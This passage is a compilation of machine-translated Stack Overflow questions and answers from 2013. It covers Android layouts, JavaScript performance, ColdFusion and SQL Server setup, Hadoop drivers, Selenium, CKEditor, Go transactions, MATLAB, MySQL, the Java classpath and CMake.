> 
> 标签：android, android-layout

我想在高度 h/3 和宽度 3w/5 的布局中显示一个绝对中心的矩形框（w：屏幕宽度，h：屏幕高度）。请帮助我找到解决方案，在此先感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-24T05:48:03.850

是的。这可以使用相对布局父级和定位为中心的另一个布局（您的框）。并且你的盒子的宽度和高度可以在java中提到，而不是在xml中。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-24T06:00:12.927

您可以使用权重使用线性布局对其进行调整，我在下面粘贴了示例代码，希望对您有所帮助。

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical"
android:background="@color/transparent"
 > 
```

```
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:layout_weight="1"
android:orientation="horizontal"
>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:layout_weight="5"
 />
 <TextView
    android:id="@+id/desiredbox"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:text="TextView"
    android:layout_gravity="center"
    android:background="@color/skyblueBackground" 
    android:layout_weight="1"
    />
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:layout_weight="5"
 />
 </LinearLayout>
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:layout_weight="1"
/> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T05:46:01.177

创建一个扩展`View`类的自定义视图并覆盖该`onDraw()`方法以创建所需的矩形。大家可以参考：[Android canvas draw rectangle](https://stackoverflow.com/questions/7344497/android-canvas-draw-rectangle)大致了解一下。

如果您的问题是：如何在容器内定位视图 - 在父视图的构造函数中添加：

```
 final ViewTreeObserver vto = this.getViewTreeObserver();
    vto.addOnGlobalLayoutListener(new OnGlobalLayoutListener() {

        @Override
        public void onGlobalLayout() {
                // here, the dimensions of the parent are available
                int containerHeight = instance.getHeight();
                int containerWidth = instance.getWidth();       

                childView.setY(containerHeight/3);
                childView.setX(containerWidth * 3 / 5);
                instance.getViewTreeObserver().removeGlobalOnLayoutListener(this);

            }       
        }
    }); 
```

`instance`对您的容器视图的引用在哪里。

# javascript - Underscore.js 性能问题 - 我可以使用 _.defer

> ID：16184218
> 
> 赞同：0
> 
> 时间：2013-04-24T05:43:01.647
> 
> 标签：javascript, jquery, performance, foreach, underscore.js

在我使用 underscore.js 和 jquery 构建的一个简单的 Web 应用程序中。对于所有人（js 对象）的列表，我正在过滤掉他们访问过的所有地方（js 对象）的列表。人员列表是一个`td`带有地点图像图标的 html 表格，单击该图标会显示他们访问过的所有地点的列表。**图标只需要对至少访问过一个地方的人显示**。这里的问题是人员和地点的计数出现了`2000`，`100`。所以下面的代码执行`2000*100`组合。浏览器抱怨我没有响应的脚本。代码如下

```
_.each(peopleList, function (person, index, list) {

    //filter the respective places for people
    var visitedPlaces = _.filter(places, function (place) {
        return place.PeopleId == person.Id;
    });

    if (_.isEmpty(visitedPlaces)) {
        $("a#" + place.PeopleId).remove();
    }
}); 
```

死的简单是不是。对于每个人，检查访问过的地方是否对他进行了跟踪。我如何优化上述代码以解除阻塞和响应。尝试在某些地方放置`_.defer`，`_.delay`但没有改善

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T11:29:29.810

FWIW，这是我用下划线解决它的方法。

```
function removeNonTravelers(people, visits) {
    var travelers    = _.pluck(visits, 'PeopleId'),
        nonTravelers = _.reject(people, function (person) {
            return _.contains(travelers, person.Id);
        });

    $(_.map(nonTravelers, document.getElementById)).remove();
} 
```

[http://jsfiddle.net/FWzeN/](http://jsfiddle.net/FWzeN/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-24T06:35:13.363

我的建议是去掉下划线并为此使用纯 JS：

```
function removeNonTravelers(people, visits) {
    var i, peopleId,
        numPeople = people.length,
        numVisits = visits.length,
        index = {}, nonTravelers = [];

    // index
    for (i = 0; i < numVisits; i++) {
        peopleId = visits[i].PeopleId;

        if (!index.hasOwnProperty(peopleId)) {
            index[peopleId] = 1;
        } else {
            index[peopleId]++;
        }
    }

    // find HTML elements to remove
    for (i = 0; i < numPeople; i++) {
        peopleId = people[i].Id;

        if (!index.hasOwnProperty(peopleId)) {
            nonTravelers.push(document.getElementById(peopleId));
        }
    }

    // remove them all at once
    $(nonTravelers).remove();
} 
```

这是相当快的。如果我没有犯任何错误，您的测试用例（2000 人，100 个地点）在我相当过时的笔记本电脑（不包括 DOM 操作）上每秒执行超过 700 次操作。

自己试试：http: [//jsperf.com/where-not-exists-in-javascript](http://jsperf.com/where-not-exists-in-javascript)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:32:06.177

```
var hashMap = {};

_.each(places, function(place) {
  hashMap[place.PeopleId] = place;
});

_.each(peopleList, function (person, index, list) {

    //filter the respective project documents
    var visitedPlaces = hashMap[person.id];

    if (visitedPlaces) {
        $("a#" + place.PeopleId).remove();
    }
}); 
```

# windows-8 - ColdFusion 10 管理员、MS SQL 2012 和 Windows 8

> ID：16184225
> 
> 赞同：1
> 
> 时间：2013-04-24T05:43:59.627
> 
> 标签：windows-8, coldfusion, coldfusion-10, sql-server-2012-express

我一直在尝试在 Windows 8 的 ColdFusion Administrator 中添加数据源，但遇到了很多问题。以下是我所做的：

1.  数据库创建了“onesBlog”。
2.  登录创建的个人博客使用密码个人博客/SQL Server 身份验证指向默认数据库个人博客
3.  用户 onesBlog 使用 dbo 的默认架构创建。
4.  为 SQLEXPRESS 启用命名管道
5.  TCP/IP - 所有 IP1 到 IP11 都处于活动状态，已启用，TCP 动态端口为空白且 TCP 端口为 1433。
6.  服务已重新启动。

在 ColdFusion Administrator 中的数据源下，我使用 Microsoft SQL Server 创建了一个名为 1ssBlog 的数据源。我填写了以下字段：

*   CF 数据源名称：`1ssBlogg`
*   数据库：`onessBlog`
*   服务器： `127.0.0.1`和`localhost`
*   港口：`1433`
*   用户名：`this is blank`
*   密码：`this is also blank`

验证连接后，我收到以下错误：`Cannot open database "onessBlog" requested by the login. The login failed.`

我查看了以下资源，但我不知道我错过了什么：

*   [Adobe 文档](http://help.adobe.com/en_US/ColdFusion/10.0/Admin/WSc3ff6d0ea77859461172e0811cbf364104-7fe5.html)
*   [本地 SQL Server 2008 ColdFusion 数据源](http://www.mattgifford.co.uk/local-sql-server-2008-coldfusion-datasource)
*   [如何配置 ColdFusion 8 数据源以连接到本地 SQL Server 2008 服务器？](https://stackoverflow.com/questions/5475702/how-do-you-configure-a-coldfusion-8-datasource-to-connect-to-a-local-sql-server)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T15:22:21.630

正如 Miguel-F 上面评论的那样，他问我为什么用户名和密码字段是空白的。我回答说，根据 Adob​​e Docs，它建议我将用户名和密码字段留空。显然，情况并非如此。下面概述了获取与 ColdFusion 连接的新实例 SQL Server 的步骤：

1.  使用 SQL Server Management Studio，通过转到对象资源管理器添加一个新数据库，右键单击“数据库”并单击“新数据库”。输入名称并保留默认值以用于开发目的。
2.  仍在对象资源管理器中，在“登录”上的“安全”下，选择“新登录”。输入登录名并选择“SQL Server 身份验证”。出于开发目的，至少取消选中“用户必须在下次登录时更改密码”
3.  仍然在对象资源管理器中，展开已创建的新数据库并右键单击“安全”并选择“新用户”。选择用户类型“具有登录的 SQL 用户”并键入用户名。对于“登录名”，按三点按钮“...”并浏览并选择上面创建的用户名。出于开发目的，选择默认模式为“dbo”。
4.  [视频“在 SQL Server 2008 R2 中创建用户”](http://www.youtube.com/watch?v=t8f1lGdnXJY)
5.  退出 SQL Server Management Studio，转到 sql Server 配置管理器。展开“SQL Server 网络配置”并选择“SQLEXPRESS 协议”。通过右键单击启用“命名管道”。
6.  双击“TCP/IP”。在 IP 地址选项卡中，为每个“启用”字段键入“是”，其中“活动”为“是”。删除“TCP 动态端口”的所有条目，并为任何“TCP 端口”输入“1433”。
7.  保存更改并选择“SQL Serve Services”右键单击“SQL Server”并通过右键单击并单击“重新启动”重新启动服务。
8.  [本地 SQL Server 2008 ColdFusion 数据源](http://www.mattgifford.co.uk/local-sql-server-2008-coldfusion-datasource)
9.  登录到 ColdFusion 管理员。`http://127.0.0.1:8500/CFIDE/administrator/index.cfm`如果保留默认值，则应该是。单击“数据源”。输入数据源名称并选择“Microsoft SQL Server”作为驱动器类型。
10.  在“数据库”字段中，输入在步骤 1 中创建的数据库的名称。
11.  在“服务器”字段中，输入`127.0.0.1`“端口” `1433`。
12.  在“用户名”字段中，输入在步骤 2 中创建并在步骤 3 中选择的用户名。
13.  在“密码”字段中，输入该用户名的密码。
14.  提交，如果未验证，请验证连接。

# hadoop - Hadoop程序驱动程序的多种编写方法-选择哪一种？

> ID：16184227
> 
> 赞同：1
> 
> 时间：2013-04-24T05:44:20.183
> 
> 标签：hadoop

我观察到有多种方法可以编写 Hadoop 程序的驱动方法。

以下方法在[Yahoo 的 Hadoop 教程中给出](http://developer.yahoo.com/hadoop/tutorial/module4.html)

```
 public void run(String inputPath, String outputPath) throws Exception {
    JobConf conf = new JobConf(WordCount.class);
    conf.setJobName("wordcount");

    // the keys are words (strings)
    conf.setOutputKeyClass(Text.class);
    // the values are counts (ints)
    conf.setOutputValueClass(IntWritable.class);

    conf.setMapperClass(MapClass.class);
    conf.setReducerClass(Reduce.class);

    FileInputFormat.addInputPath(conf, new Path(inputPath));
    FileOutputFormat.setOutputPath(conf, new Path(outputPath));

    JobClient.runJob(conf);
  } 
```

`Hadoop The Definitive Guide 2012`Oreilly在书中给出了这种方法。

```
public static void main(String[] args) throws Exception {
  if (args.length != 2) {
    System.err.println("Usage: MaxTemperature <input path> <output path>");
    System.exit(-1);
  }
  Job job = new Job();
  job.setJarByClass(MaxTemperature.class);
  job.setJobName("Max temperature");
  FileInputFormat.addInputPath(job, new Path(args[0]));
  FileOutputFormat.setOutputPath(job, new Path(args[1]));
  job.setMapperClass(MaxTemperatureMapper.class);
  job.setReducerClass(MaxTemperatureReducer.class);
  job.setOutputKeyClass(Text.class);
  job.setOutputValueClass(IntWritable.class);
  System.exit(job.waitForCompletion(true) ? 0 : 1);
} 
```

在尝试 Oreilly 书中给出的程序时，我发现`Job`类的构造函数已被弃用。由于 Oreilly 的书基于 Hadoop 2（纱线），我很惊讶地发现他们使用了已弃用的类。

我想知道大家都用什么方法？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T07:39:58.913

我使用前一种方法。如果我们重写 run() 方法，我们可以使用 hadoop jar 选项，如 -D、-libjars、-files 等。所有这些在几乎任何 hadoop 项目中都是非常必要的。不确定我们是否可以通过 main() 方法使用它们。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-24T11:39:32.843

与您的第一个（雅虎）块略有不同 - 您应该使用利用 GenericOptionsParser 的 ToolRunner / Tool 类（如 Eswara 的回答中所述）

模板模式类似于：

```
import org.apache.hadoop.conf.Configured;
import org.apache.hadoop.mapred.JobConf;
import org.apache.hadoop.mapreduce.Job;
import org.apache.hadoop.util.Tool;
import org.apache.hadoop.util.ToolRunner;

public class ToolExample extends Configured implements Tool {

    @Override
    public int run(String[] args) throws Exception {
        // old API
        JobConf jobConf = new JobConf(getConf());

        // new API
        Job job = new Job(getConf());

        // rest of your config here

        // determine success / failure (depending on your choice of old / new api)
        // return 0 for success, non-zero for an error
        return 0;
    }

    public static void main(String args[]) throws Exception {
        System.exit(ToolRunner.run(new ToolExample(), args));
    }
} 
```

# git - git如何获取cppcheck报告

> ID：16184229
> 
> 赞同：0
> 
> 时间：2013-04-24T05:44:24.983
> 
> 标签：git, cppcheck

首先，`Cppcheck`检查代码会输出一个存储在文件中的结果。

中`Git`，`file`是在每个人的本地计算机中，因为 Git 是一个分布式系统，

现在我们要收集文件并分析文件。但我们不知道如何收集

我们不想将“文件”推送到服务器，这太复杂了

而且我们也不想要求每个人都将他们的文件发送给我。

那么如何`files`轻松收集呢？

# php - Klarna 结帐返回 http_status_code 500 内部服务器错误作为响应

> ID：16184231
> 
> 赞同：3
> 
> 时间：2013-04-24T05:44:32.527
> 
> 标签：php, magento, curl, httprequest, httpresponse

我正在尝试使用他们[在此处提供的代码来实现 klarna 结帐。](https://docs.klarna.com/en/downloads/php)

按照此链接的指示实施流程-> [https://docs.klarna.com/en/getting-started](https://docs.klarna.com/en/getting-started)

我正在使用 docs/examples 文件夹中的代码，我已将库（src 文件夹）放在正确的路径中，并在我在[这里创建测试帐户时提供了 eid 和共享密钥以及 klarna 提供的存储 ID 和共享密钥。](https://docs.klarna.com/en/testing/apply-for-test-account)

```
// Merchant ID
$eid = 'eid';

// Shared secret
$sharedSecret = 'sharedsecret'; 
```

我已经替换了所有文件中的所有 eid 和共享密码，并正确更改了文件中的链接，

> 即 example.com 到 mywebsiteurl.com

```
$create['purchase_country'] = 'SE';
$create['purchase_currency'] = 'SEK';
$create['locale'] = 'sv-se';
$create['merchant']['id'] = $eid;
$create['merchant']['terms_uri'] = 'http://example.com/terms.html';
$create['merchant']['checkout_uri'] = 'http://example.com/checkout.php';
$create['merchant']['confirmation_uri']
    = 'http://example.com/confirmation.php' .
    '?sid=123&klarna_order={checkout.order.uri}';
// You can not receive push notification on non publicly available uri
$create['merchant']['push_uri'] = 'http://example.com/push.php' .
    '?sid=123&klarna_order={checkout.order.uri}'; 
```

正确设置所有内容后，当我单击 docs/examples/checkout.php 时，我会抛出异常，因为服务器正在响应错误代码。BasicConnector.php 由下面给出的代码引发异常，

```
 * Throw an exception if the server responds with an error code.
 *
 * @param Klarna_Checkout_HTTP_Response $result HTTP Response object
 *
 * @throws Klarna_Checkout_HTTP_Status_Exception
 * @return void
 */
protected function verifyResponse(Klarna_Checkout_HTTP_Response $result)
{
    // Error Status Code recieved. Throw an exception.
    if ($result->getStatus() >= 400 && $result->getStatus() <= 599) {
        throw new Klarna_Checkout_ConnectorException(
            $result->getData(), $result->getStatus()
        );
    }
} 
```

收到的错误是

> 致命错误：在 klarna/docs/examples/src/Klarna/Checkout/BasicConnector 中出现消息 '{"http_status_code":500,"http_status_message":"Internal Server Error","internal_message":""}' 的未捕获异常 'Klarna_Checkout_ConnectorException' .php:212

所以我的问题是

1.  我是否没有发送正确的请求，因为我可以看到请求已创建并且那里没有给出错误？

2.  我可以做些什么来从服务器获得正确的响应吗？

3.  发出 cURL 请求时，服务器何时响应错误代码？

感谢您的时间和帮助。对此，我真的非常感激。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T09:10:39.493

好吧，这样一个大问题的解决方案非常简单。

设置 eid="200" 和 sharedsecret="test"。哪些是测试帐户凭据。

就我而言，我使用的是原始商家帐户凭据。

# java - 检查 Selenium Hub/Node 是否在给定端口上运行

> ID：16184232
> 
> 赞同：0
> 
> 时间：2013-04-24T05:44:44.303
> 
> 标签：java, selenium, port

我想检查 Selenium Hub 或 Node 是否在特定端口上运行（例如：- 5555）。我已经有了检查特定端口是否空闲的代码。但我不确定如何使用端口找出应用程序。

```
if (Port is free)
    i=1
else if (Port is used as Selenium Hub)
    i=2
else if (Port is used as Selenium Node)
    i=3
else if (Port is used by apps other than Selenium)
    i=4
else
    i=5 
```

请让我知道这是否可以使用 java 完成。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T22:01:11.343

您可以尝试访问节点/服务器的已知 http url，如果它以非错误响应（让我们看到 200 OK），您可以假设它是在那里运行的 selenium，例如做一个 httpclient 到：

```
http://<host>:<port>/wd/hub/static/resource/hub.html 
```

如果它执行 404，则它不是硒。

# angularjs - Selenium Webdriver 和 angular e2e 有什么区别，什么时候应该使用它们？

> ID：16184233
> 
> 赞同：11
> 
> 时间：2013-04-24T05:44:46.320
> 
> 标签：angularjs, selenium, selenium-webdriver, webdriver, automated-tests

我需要测试一个角度应用程序，我正在考虑使用哪个测试框架。有人可以列出这两个测试框架之间的区别，每个测试框架的好/坏。什么时候应该使用它们？一个可以代替第二个吗？

编辑1：我会尽量集中我的问题。我真正感兴趣的是这两个框架的技术能力。例如，我发现的一些差异：

1.  selenium webdriver 能够在多台机器上并行运行在网格上，另一方面，角度场景的运行速度比 selenium 快得多。

2.  使用 selenium，我可以使用 Enter、Backspace 等键盘键，还可以执行拖放操作。

3.  selenium 不依赖于应用程序技术，角度仅适用于角度应用程序

    这些是我正在寻找的差异类型——一个可以做什么，另一个不能做什么

谢谢

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-24T11:18:54.843

两者都应该用于测试角度应用程序。但是，根据我的经验，它们有不同的用途。

**在将新功能集成到应用程序或更改现有功能时，**Angular e2e测试是您最好的朋友。**如果您对代码进行更改，它们可以确保您的应用程序仍然按预期运行。这些测试比 selenium 快得多，不需要那么深入，并且根据我的经验，最好在将新功能推送到版本控制服务器之前执行。**

 ****Selenium**测试应该用于回归测试。这些测试应该比 Angular e2e 测试更深入，并且应该在将代码投入生产之前执行。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-01-21T14:42:20.180

**UPDATE:** This question may be less relevant now. As of January 2014, Angular plans to move from their own E2E suite to the [protractor](https://github.com/angular/protractor) library for function tests, which use Selenium Webdriver.

> If you're starting a new Angular project, you may want to look into using Protractor, as it is going to replace the current method of E2E Testing in the near future.
> 
> (Source: [http://docs.angularjs.org/guide/dev_guide.e2e-testing](http://docs.angularjs.org/guide/dev_guide.e2e-testing))

* * *

I am struggling with this question as well.

Here is my thinking today:

1) Use Angular e2e testing for integration/regression testing the **UI with mocks** of your external dependencies (like the app server).

2) Use Selenium for integration/regression testing the **complete system** in a test/qa environment.

It seems Angular e2e testing helps fill in the gaps that unit testing leaves in testing view and controller logic that is tied to UI events. All of the Angular tests should mock external dependencies.

Selenium seems like the best fit for testing the entire system as the user will experience it.

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-24T09:01:33.387

这是一个如此主观的问题，因此我首先告诉你做一些研究。没有太大区别。

这是一个非常新的项目，而 Selenium 则要成熟得多。例如，构建 WebDriver 的 JSON Wire Protocol 是一个实际的 W3C 规范。这表明该项目非常成熟，非常稳定。

由于上述原因，Selenium 拥有更广泛的文档集和更广泛的社区。

使用 Selenium，您可以使用多种不同的语言来编写测试代码，以及使用 IDE。Angular 限制使用纯 JavaScript。对于很多手动测试人员来说，这是大多数人不具备的技能。

Selenium 和 Angular 都是开源的，这（相信我）极大地帮助调试问题和理解各自 API 中的设计决策。**

# ckeditor - CKEditor 4 - 如何将字体系列和字体大小控件添加到工具栏

> ID：16184236
> 
> 赞同：12
> 
> 时间：2013-04-24T05:45:01.337
> 
> 标签：ckeditor

我在 config.js 中有一个 config.toolbarGroups 设置，但我不知道该组使用什么名称来添加字体系列/字体大小控件。（似乎缺少这方面的文档）。我发现了一些建议，我应该使用 CKBuilder 创建一个已经包含它的包，但是我不能仅仅为了添加几个按钮而重新部署整个 ckeditor。

编辑：我的 CKEditor 是第 4 版

有什么建议吗？

谢谢！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2014-09-26T14:15:21.407

```
config.extraPlugins = 'font'; 
```

你必须添加插件...

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-10-05T12:35:44.297

有两种（互斥的）方式来配置工具栏。查看以下内容：

[http://ckeditor.com/latest/samples/plugins/toolbar/toolbar.html](http://ckeditor.com/latest/samples/plugins/toolbar/toolbar.html)

我首先尝试使用 config.toolbarGroups，但最终改用了 config.toolbar。这是我最终使用的：

```
config.toolbar = [
                { name: 'save', items: [ 'savebtn','Undo','Redo' ] },
                { name: 'clipboard', items: [ 'Cut','Copy','Paste','PasteText','PasteFromWord'] },
                { name: 'document', items: [ 'Find','Replace'] },
                '/',
                { name: 'lists', items: [ 'NumberedList','BulletedList','Outdent','Indent'] },
                { name: 'insert', items: [ 'Image','Table','Smiley','SpecialChar'] },
                { name: 'link', items: ['Link','Unlink'] },
                '/',
                { name: 'basicstyles', items: [ 'Font','FontSize','Bold','Italic','Underline','Strike','Subscript','Superscript'] },
                //'/',
                { name: 'align', items: [ 'JustifyLeft','JustifyCenter','JustifyRight','JustifyBlock'] }
        ]; 
```

请注意，我使用的是由 kasper Taeymans 慷慨提供的保存插件，可以在以下位置找到：

[如何在 CKeditor 4.2.1 中添加带有加载 gif 的 ajax 保存按钮。[工作示例插件]](https://stackoverflow.com/questions/18956257/how-to-add-an-ajax-save-button-with-loading-gif-to-ckeditor-4-2-1-sample-plugi)

我还发现以下文档非常有用，尽管它与版本 3 相关：

[http://docs.cksource.com/CKEditor_3.x/Developers_Guide/Toolbar](http://docs.cksource.com/CKEditor_3.x/Developers_Guide/Toolbar)

我使用本文中的信息来生成我的配置（我使用的是 4.2.1 版），特别是项目的名称（例如剪切、复制、粘贴），因为在我的案例中这是缺少的链接。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-13T15:26:12.727

我花了很长时间才弄清楚我也必须明确地添加`FontSize`到工具栏 - 似乎`Font`不仅仅适用。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T05:51:09.163

这可用于在 CkEditor 中添加字体系列和字体大小。

这将在 config.js 中完成。

另请参阅[文档](http://docs.cksource.com/CKEditor_3.x/Developers_Guide/Toolbar)

```
 config.font_names = 'Arial;Times New Roman;Verdana;' +  CKEDITOR.config.font_names;

config.toolbar_Full =
[
     { name: 'basicstyles', items : [ 'Bold','Italic','Underline','Strike','Subscript','Superscript','-','RemoveFormat' ] },

    { name: 'paragraph', items : [ 'Outdent','Indent','-','Blockquote','CreateDiv','-',
                'JustifyLeft','JustifyCenter','JustifyRight','JustifyBlock','-','BidiLtr','BidiRtl' ] }    

];

config.toolbar = 'Full'; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-10-22T06:16:24.073

直接使用脚本添加：

```
CKEDITOR.replace('content', {
      extraPlugins: 'uicolor,colorbutton,colordialog,font',
}); 
```

要更改文本的默认样式：

```
CKEDITOR.addCss(".cke_editable{cursor:text; font-size: 25px; color: #FFFFFF;background-color: #006991;}"); 
```

# sql - database/sql Tx - 检测提交或回滚

> ID：16184238
> 
> 赞同：47
> 
> 时间：2013-04-24T05:45:26.517
> 
> 标签：sql, go

使用 database/sql 和驱动程序包和 Tx，如果不尝试另一个事务并因此收到错误，然后检查错误以确定事务的类型，就不可能检测到事务是否已提交或回滚。错误。我希望能够从 Tx 对象中确定是否已提交。当然，我可以在使用 Tx 的函数中定义和设置另一个变量，但我有很多变量，每次都是 2 次（变量和赋值）。如果需要，我还有一个延迟函数来执行回滚，并且需要将它传递给 bool 变量。

在 Commit 或 Rollback 之后将 Tx 变量设置为 nil 是否可以接受，并且 GC 是否会恢复任何内存，或者这是一个禁忌，还是有更好的选择？

* * *

## 回答 #1

> 赞同：151
> 
> 时间：2014-05-06T18:48:48.410

您要确保`Begin()`、`Commit()`和`Rollback()`出现在同一个函数中。它使交易更易于跟踪，并允许您使用`defer`.

这是一个示例，它根据是否返回错误执行 Commit 或 Rollback：

```
func (s Service) DoSomething() (err error) {
    tx, err := s.db.Begin()
    if err != nil {
        return
    }
    defer func() {
        if err != nil {
            tx.Rollback()
            return
        }
        err = tx.Commit()
    }()
    if _, err = tx.Exec(...); err != nil {
        return
    }
    if _, err = tx.Exec(...); err != nil {
        return
    }
    // ...
    return
} 
```

这可能会有点重复。另一种方法是使用事务处理程序包装您的事务：

```
func Transact(db *sql.DB, txFunc func(*sql.Tx) error) (err error) {
    tx, err := db.Begin()
    if err != nil {
        return
    }
    defer func() {
        if p := recover(); p != nil {
            tx.Rollback()
            panic(p) // re-throw panic after Rollback
        } else if err != nil {
            tx.Rollback() // err is non-nil; don't change it
        } else {
            err = tx.Commit() // err is nil; if Commit returns error update err
        }
    }()
    err = txFunc(tx)
    return err
} 
```

使用上面的事务处理程序，我可以这样做：

```
func (s Service) DoSomething() error {
    return Transact(s.db, func (tx *sql.Tx) error {
        if _, err := tx.Exec(...); err != nil {
            return err
        }
        if _, err := tx.Exec(...); err != nil {
            return err
        }
        return nil
    })
} 
```

这使我的交易保持简洁，并确保交易得到妥善处理。

在我的事务处理程序中，我`recover()`用来捕获恐慌以确保立即发生回滚。如果预期会出现恐慌，我会重新引发恐慌以允许我的代码捕获它。在正常情况下不应该发生恐慌。应该返回错误。

如果我们不处理恐慌，事务最终将被回滚。当客户端断开连接或事务被垃圾收集时，数据库会回滚未提交的事务。但是，等待事务自行解决可能会导致其他（未定义）问题。所以最好尽快解决。

可能无法立即清楚的一件事是，`defer`如果返回变量被捕获，则可以更改闭包内的返回值。在事务处理程序中，当`err`（返回值）为 nil 时，事务被提交。调用`Commit`也可以返回错误，因此我们将其返回设置为 err with `err = tx.Commit()`。我们不这样做，`Rollback`因为`err`它是非零的，我们不想覆盖现有的错误。

# matlab - 如何在 MATLAB 中将元胞数组更改为数值？

> ID：16184239
> 
> 赞同：1
> 
> 时间：2013-04-24T05:45:35.227
> 
> 标签：matlab

我想做以下事情

输入：（元胞数组）

> 抗体
> 
> 交流
> 
> 广告
> 
> aab
> 
> 交流
> 
> aac
> 
> aab
> 
> 交流

我希望输出映射到唯一的数值，例如

> 1
> 
> 2
> 
> 3
> 
> 4
> 
> 2
> 
> 5
> 
> 4
> 
> 2

是否有捷径可寻？输入约为 250,000，长度可变。我只想将具有相同内容的单元格映射到相同的数字。

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-24T05:52:17.390

如果我们将您的元胞数组称为 A，那么以下命令将满足您的需求：

```
[uniqueCells,~,idxYouWant] = unique(A); 
```

在此，`uniqueCells`是您拥有的唯一值（按排序顺序）；并且`idxYouWant`是您想要的数字数组，其中

```
A = uniqueCells(idxYouWant); 
```

我认为这正是你所需要的。

# mysql - ORDER BY 日期多个表

> ID：16184240
> 
> 赞同：-4
> 
> 时间：2013-04-24T05:45:42.067
> 
> 标签：mysql, sql, database

我有一个包含我的用户的表和一个包含他们关注的人的表，我还有一个包含他们状态更新的表。我需要按时间顺序排列状态。我能想到的唯一方法是让他们关注的人，然后一个一个地获得他们的状态，这意味着它只对单身人士按时间顺序排列。例如。

泰勒 - 在聚会上玩得很开心。时间：下午 1 点
Tyler - 大家早上好。时间：上午 10 点
Ben - 大家都在做什么？时间：下午2点

编辑 - - - - -

用户表 ![用户表](https://i.stack.imgur.com/RzXLC.png) 状态表 ![状态表](https://i.stack.imgur.com/cn37Z.png) 关注者表 ![追随者表](https://i.stack.imgur.com/yBeTE.png)

用户 1 关注用户 2。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T05:56:37.473

您将要使用联接。

这些方面的东西：

```
SELECT b.name, a.status, a.datetime FROM statuses a JOIN users b ON a.userid = b.id WHERE a.userid IN (SELECT c.userid FROM people c WHERE c.follower = :followerid) ORDER BY a.datetime 
```

# java - 设置类路径时遇到问题

> ID：16184244
> 
> 赞同：0
> 
> 时间：2013-04-24T05:46:00.083
> 
> 标签：java, classpath

我试图查找有关具有相同问题的人的其他问题，并且我重新阅读了文档，但这整天困扰着我

我有 Coffee.Java ，它位于 C:\Learning Java\209\CoffeeProject\machine

* * *

```
package machine;
public class Coffee {    
    private static long counter = 0;
    private final long id = counter++;
    public String toString() {
        return getClass().getSimpleName() + " "+ id;
    }
} 
```

和拿铁，这只是

```
//Latte.java
package machine;
public class Latte extends Coffee{} 
```

我正在尝试通过这样做来设置路径

```
java -classpath C:\Learning Java\209\CoffeeProject machine.Coffee 
```

但它给了我错误

无法找到或加载主类 Java\209\CoffeeProject

我已经离开了

[http://docs.oracle.com/javase/1.5.0/docs/tooldocs/windows/classpath.html](http://docs.oracle.com/javase/1.5.0/docs/tooldocs/windows/classpath.html)

编辑：我尝试了引号，它有效。谢谢。现在它说main method not found，也没有，但它只是设置了，所以我可以扩展它，这就是书中的内容。在我什至可以执行 Classpath 之前，我是否必须拥有所有这些设置的 main 的最后一个程序？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T05:49:22.343

尝试：

```
java -classpath "C:\Learning Java\209\CoffeeProject" machine.Coffee 
```

“学习Java”中的空间会导致问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T05:49:31.863

该`classpath`选项（或与此相关的其他命令行选项）不能包含空格而不将整个类路径括在引号中。所以试试吧`-cp "C:\Learning Java\209\CoffeeProject"`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-09T12:36:46.307

## 如果找到空格，请在类路径中使用引号

根据经验，如果`classpath`您[的](http://www.digizol.com/2006/12/setting-java-classpath-option-with.html).

# cmake - Cmake找不到环境变量

> ID：16184248
> 
> 赞同：0
> 
> 时间：2013-04-24T05:46:16.803
> 
> 标签：cmake, hevc

我正在使用 Windows 7 上的 cmake 构建 OpenHEVC ( [https://github.com/OpenHEVC/openHEVC](https://github.com/OpenHEVC/openHEVC) ) 到 VS2010 项目。

在根目录的 CMakeLists.txt 中，我找到以下行：

```
include_directories(. ${SDL_INCLUDE_DIR} wrapper_hm/src/Lib) 
```

我认为“${SDL_INCLUDE_DIR}”应该是 SDL 库（[http://www.libsdl.org/download-1.2.php](http://www.libsdl.org/download-1.2.php)）。

我的问题是，在下载 SDL 库并设置一个名为“SDL_INCLUDE_DIR”的新环境变量后，该变量包含 SDL 的路径（我可以在命令行中“回显 %SDL_INCLUDE_DIR%”）。CMake 只是不断给我这个（即使在重新启动 Cmake 之后）：

